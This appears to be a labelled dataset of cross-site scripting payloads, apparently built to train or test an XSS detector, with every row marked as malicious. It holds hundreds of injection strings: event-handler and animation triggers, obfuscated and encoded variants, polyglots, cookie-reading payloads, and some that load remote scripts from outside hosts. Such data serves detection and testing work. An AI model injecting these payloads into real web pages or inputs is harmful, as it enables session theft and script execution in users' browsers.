payload,xss
"&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;",1
"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></wbr>",1
"<spacer onmousemove=""alert(1)"">AnonKryptiQuz</spacer>",1
"""><svg%20onload=alert%26%230000000040""mysanismine"")>",1
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,1
"<shadow ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</shadow>",1
"<noembed oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",1
<button popovertarget=x>Click me</button><image onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</image>,1
"<cite onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</cite>",1
{{0[a='constructor'][a]('alert(1)')()}},1
"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable style=display:block>drop here</nav>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></progress>",1
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionstart=alert(1)></style>",1
"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",1
<h1/%6f%6e/oNclicK=alert``>AnonKryptiQuz,1
"<blink onmousedown=""alert(1)"">AnonKryptiQuz</blink>",1
"<image oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"""></iframe><script>alert(123)</script>",1
"<style>:target {color:red;}</style><element id=x style=""transition:color 1s"" ontransitionend=alert(1)></element>",1
"<style>:target {color: red;}</style><strike id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strike>",1
"<img+src=oNlY=1+ onerror=""alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))"">",1
"<acronym onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",1
"<video2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</video2>",1
<listing id=x tabindex=1 onfocus=alert(1)></listing>,1
"<shadow onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",1
"<IMG SRC=""jav    ascript:javascript:alert(1);"">",1
"<b draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</b>",1
ignition/scripts/--><svg%20onload=alert%28document.domain%29>,1
<area onmousewheel=alert(1) style=display:block>requires scrolling,1
"<img src=""javascript:alert('XSS');"">",1
eval('al'+'ert'+'(12)');//,1
<param onpointerleave=alert(1) style=display:block>AnonKryptiQuz</param>,1
<button popovertarget=x>Click me</button><section onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</section>,1
"<canvas draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",1
<svg><param onload=alert(1)></param>,1
<label id=x tabindex=1 onfocus=alert(1)></label>,1
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,1
<button popovertarget=x>Click me</button><bdo ontoggle=alert(1) popover id=x>AnonKryptiQuz</bdo>,1
"<a href=""jav%0Dascript&colon;alert(1)"">",1
<embed contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"xss""><!--><svg/onload=alert(document.domain)>",1
"onerror=""x='ale';z='r';y='t';p='`AnonKryptiQuz`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`",1
"<script draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</script>",1
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>",1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onwebkitanimationend=""alert(1)""></aside>",1
<mark onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</mark><input value=clickme>,1
"""<script>1-confirm(0);</script>""/>",1
"<pre onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",1
<style>img{background-image:url('javascript:alert(1)')}</style>,1
"<style>:target {color:red;}</style><aside id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></aside>",1
"<div id=""128""><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[""'`-->]]>]</div>",1
"<acronym draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",1
<button popovertarget=x>Click me</button><listing onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</listing>,1
"<sup onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",1
<animate onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</animate><input value=clickme>,1
"""><img src=x onerror=eval('prompt(document.domain)')>",1
"<style>:target {transform: rotate(180deg);}</style><col id=x style=""transition:transform 2s"" ontransitionrun=print()></col>",1
"<param draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</param>",1
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationstart=""alert(1)""></tbody>",1
"<marquee id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></marquee>",1
"<style>@keyframes slidein {}</style><svg style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></svg>",1
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></del>",1
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,1
‘ onmouseover=’alert(1)’,1
""">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",1
<style>@import 'javascript:alert(AnonKryptiQuz)';</style>,1
"<legend onmousemove=""alert(1)"">AnonKryptiQuz</legend>",1
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,1
"<style>@keyframes x{}</style><content style=""animation-name:x"" onwebkitanimationend=""alert(1)""></content>",1
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationstart=""alert(1)""></blink>",1
"<style>:target {transform: rotate(180deg);}</style><legend id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></legend>",1
<button popovertarget=x>Click me</button><element onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</element>,1
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" ontransitionend=alert(1)></tt>",1
"<shadow onmousedown=""alert(1)"">AnonKryptiQuz</shadow>",1
"<summary draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",1
<button popovertarget=x>Click me</button><textarea ontoggle=alert(1) popover id=x>AnonKryptiQuz</textarea>,1
"<datalist draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",1
%27;%0d%0d});%0d{onerror=prompt}throw document.location</ScRipT//,1
"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>",1
"<a draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</a>",1
<pre onpointermove=alert(1) style=display:block>AnonKryptiQuz</pre>,1
"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></dir>",1
"%3F%20""><img src=x onerror=prompt(document.domain);>",1
"<animatetransform onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",1
"<dir onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",1
<noembed onpointerout=alert(1) style=display:block>AnonKryptiQuz</noembed>,1
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationend=""alert(1)""></base>",1
"<head oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<option draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</option>",1
<button popovertarget=x>Click me</button><strike onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</strike>,1
"javascript:""/*`/*\""/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script>",1
"<cite onmouseleave=""alert(1)"">AnonKryptiQuz</cite>",1
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>,1
"<samp oncut=""alert(1)"" contenteditable>AnonKryptiQuz</samp>",1
#'%26%26'javascript:alert%25281%2529//,1
<a href=javascript:alert(1)>click,1
"<tbody draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</tbody>",1
"<xss style=""x:expression(alert('AnonKryptiQuz'))"">",1
"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",1
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;,1
<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>,1
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>,1
"<head onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</head>",1
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></shadow>",1
<caption onafterscriptexecute=alert(1)><script>1</script>,1
"<textarea onclick=""alert(1)"">AnonKryptiQuz</textarea>",1
"<audio onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",1
"<animate draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</animate>",1
"<li draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</li>",1
"<html onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</html>",1
<datalist onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</datalist>,1
"<path d=""M0,0"" style=""marker-start:url(AnonKryptiQuz4.svg#a)""/>",1
"<embed onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",1
"<dfn draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</dfn>",1
"<image onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</image>",1
<textarea onbeforecopy=alert(1) autofocus>AnonKryptiQuz</textarea>,1
"<div id=""63""><embed src=""javascript:alert(63)""></embed> // O10.10↓, OM10.0↓, GC6↓, FF",1
<button popovertarget=x>Click me</button><tbody ontoggle=alert(1) popover id=x>AnonKryptiQuz</tbody>,1
"<q onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</q>",1
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationstart=""alert(1)""></a>",1
"<applet onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</applet>",1
"""><script src=//brutelogic.com.br&sol;1.js&num;",1
"<div draggable=""true"" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable style=display:block>drop here</tt>",1
"<nav draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</nav>",1
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",1
"<data id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></data>",1
"<noscript onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",1
"ryp3i""accesskey=""x""onclick=""alert(1)""//opk15",1
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable style=display:block>drop here</data>",1
<noframes onafterscriptexecute=alert(1)><script>1</script>,1
<link id=x tabindex=1 onactivate=alert(1)></link>,1
"<rt oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<isindex ondblclick=""alert(1)"">AnonKryptiQuz</isindex>",1
"<mark onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</mark>",1
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,1
"javascript:""/*'//`//\""//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert()//</script>",1
<textarea onbeforecut=alert(1) autofocus>AnonKryptiQuz</textarea>,1
"<a onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</a>",1
"<dialog onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",1
"<col draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</col>",1
<applet onpointermove=alert(1) style=display:block>AnonKryptiQuz</applet>,1
"<xmp onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",1
<keygen autofocus onfocus=alert(1)>,1
"<xmp onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",1
%BCscript%BEalert(%A21%A2)%BC/script%BE,1
"<iframe2 draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",1
"<ruby onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",1
<textarea onmousewheel=alert(1) style=display:block>requires scrolling,1
<Img Src=OnAnonKryptiQuz OnError=confirm(1337)>,1
"<a/href=""j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)"" />click",1
'%27%3E%27%22%3E%3Cscript%3Ealert(2);%3C/script%3E',1
"<;IMG SRC="";mocha:[code]"";>;",1
<svg%0Ao%00nload=%09((pro\u006dpt))()//,1
"<address onmouseleave=""alert(1)"">AnonKryptiQuz</address>",1
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationend=""alert(1)""></select>",1
"<main draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</main>",1
"<video2 onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</video2>",1
<xmp onpointerover=alert(1) style=display:block>AnonKryptiQuz</xmp>,1
<script>javascript:alert(1)<\x00/script>,1
"<applet id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></applet>",1
<legend onpointerenter=alert(1) style=display:block>AnonKryptiQuz</legend>,1
"<option draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</option>",1
VasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e,1
"<var draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</var>",1
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,1
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionend=alert(1)></form>",1
"<hgroup onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",1
"<img+<iframe =""1"" onerror=""alert(1)"">",1
"<p draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</p>",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",1
<dir onpointerout=alert(1) style=display:block>AnonKryptiQuz</dir>,1
<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>,1
"<meter onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</meter>",1
"<input draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</input>",1
"onload=\""a='alert()';d='AnonKryptiQuz ';b='t(d)';c=a+b;console.log(eval(c));",1
<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>,1
"<u onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</u>",1
"<s onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</s>",1
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",1
%E5%98%8D%E5%98%8A%20<img src=1 onerror=alert(1)>,1
"<JavaScript:""\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76""/ContentEditable/AutoFocus/OnFocus=location=tagName>",1
<input2 onpointerover=alert(1) style=display:block>AnonKryptiQuz</input2>,1
"<style>@keyframes slidein {}</style><base style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></base>",1
<video2 onbeforescriptexecute=alert(1)><script>1</script>,1
"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",1
"<article onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</article>",1
parameter=<svg/&parameter=onload=alert()>,1
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></ul>",1
"<ruby draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</ruby>",1
"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",1
<dfn onpointerenter=alert(1) style=display:block>AnonKryptiQuz</dfn>,1
"<script onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</script>",1
<canvas onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</canvas>,1
"<b onclick=""alert(1)"">AnonKryptiQuz</b>",1
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" ontransitionend=alert(1)></hr>",1
"<style>:target {color:red;}</style><progress id=x style=""transition:color 1s"" ontransitionstart=alert(1)></progress>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></u>",1
"<image2 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",1
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",1
"<div draggable=""true"" contenteditable>drag me</div><image3 ondrop=alert(1) contenteditable style=display:block>drop here</image3>",1
<svg onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</svg>,1
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",1
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E,1
jAvaScripT:(alert)`AnonKryptiQuz`,1
"<input draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</input>",1
<button popovertarget=x>Click me</button><content ontoggle=alert(1) popover id=x>AnonKryptiQuz</content>,1
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",1
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<title onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</title>",1
"<style>:target {transform: rotate(180deg);}</style><select id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></select>",1
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationend=""alert(1)""></col>",1
"<code draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</code>",1
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;,1
"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></shadow>",1
"<noembed draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</noembed>",1
"<table draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</table>",1
"<canvas draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",1
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></body>",1
"<dialog onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",1
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",1
<button popovertarget=x>Click me</button><ul ontoggle=alert(1) popover id=x>AnonKryptiQuz</ul>,1
"<big oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</big>",1
"<listing onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</listing>",1
"<noscript onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</noscript>",1
"<map onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</map>",1
"<script oncontextmenu=""alert(1)"">AnonKryptiQuz</script>",1
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,1
<figure id=x tabindex=1 onactivate=alert(1)></figure>,1
<embed src=javascript:alert(1)>,1
"""><img src='x' onerror='prompt(document.domain);'>",1
"<var oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</var>",1
"<sup draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</sup>",1
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable style=display:block>drop here</element>",1
<shadow onmousewheel=alert(1) style=display:block>requires scrolling,1
<progress contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"-(a=alert,b=""_Y000!_"",[b].find(a))-'",1
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""",1
"""><img src=x onmouseover=prompt(\u0064ocument.domain);>",1
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;,1
"<em onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</em>",1
<button popovertarget=x>Click me</button><iframe onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</iframe>,1
"<maction actiontype=""statusline"" xlink:href=""javascript:alert(3)"">CLICKME<mtext>http://http://google.com</mtext></maction>",1
"<sup onmouseover=""alert(1)"">AnonKryptiQuz</sup>",1
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=print()></wbr>",1
"<style>@keyframes slidein {}</style><canvas style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></canvas>",1
"<textarea draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",1
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,1
"""><sc<>ript><onxXxxXXxXXXxx=()%20autofoco%20onmouseover=alert(""HEJAP ZAIRY AL-SHARIF"")></scr<>ipt>",1
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""AnonKryptiQuz\"")';&lt;/STYLE&gt;",1
<button onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</button><input value=clickme>,1
</script><svg><script>alert(1)-%26apos%3B,1
<svg id=alert(1) onload=eval(id)>,1
"<b draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</b>",1
<x onmouseup=alert(1)>click this!,1
"<dfn onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",1
"<tbody onmousemove=""alert(1)"">AnonKryptiQuz</tbody>",1
<samp onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</samp><input value=clickme>,1
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,1
"""><img src=""javascript:alert(1);"" />",1
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=print()></input>",1
"<acronym onmouseenter=""alert(1)"">AnonKryptiQuz</acronym>",1
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" ontransitionend=alert(1)></frameset>",1
<blink contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<s oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<i onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</i>",1
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></meter>",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",1
"<video2 onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</video2>",1
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out,1
"<content onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</content>",1
//%250Aalert?.(1)//,1
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",1
<fieldset onpointerout=alert(1) style=display:block>AnonKryptiQuz</fieldset>,1
!');script(2);//,1
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,1
"<option onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</option>",1
<canvas onpointerover=alert(1) style=display:block>AnonKryptiQuz</canvas>,1
<colgroup contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onwebkitanimationend=""alert(1)""></abbr>",1
<sup onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</sup><input value=clickme>,1
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable style=display:block>drop here</img>",1
<sup onpointerover=alert(1) style=display:block>AnonKryptiQuz</sup>,1
"<figcaption draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",1
"<img onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</img>",1
"<input4 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",1
"<input2 onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</input2>",1
"<output oncontextmenu=""alert(1)"">AnonKryptiQuz</output>",1
"<a oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</a>",1
"<frame onclick=""alert(1)"">AnonKryptiQuz</frame>",1
"<command onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</command>",1
"<i draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</i>",1
<button onpointerout=alert(1) style=display:block>AnonKryptiQuz</button>,1
"<video><track default onload=alert(1) src=""data:text/vtt,WEBVTT""></video>",1
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tbody>",1
"""-eval(""window['pro'%2B'mpt'](8)"")-""",1
<big onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</big>,1
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",1
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",1
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",1
"<i onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</i>",1
search?q=<img/src/onerror=alert(`AnonKryptiQuz`)>,1
<iframe2 onmousewheel=alert(1) style=display:block>requires scrolling,1
"<ul draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</ul>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""print()""></dd>",1
"<th onclick=""alert(1)"">AnonKryptiQuz</th>",1
<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>,1
"<image3 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",1
"<embed draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",1
"<a onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</a>",1
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=print()></colgroup>",1
"""><img/src=x/onerro=6><img/src=""1""/onerror=alert(1);>",1
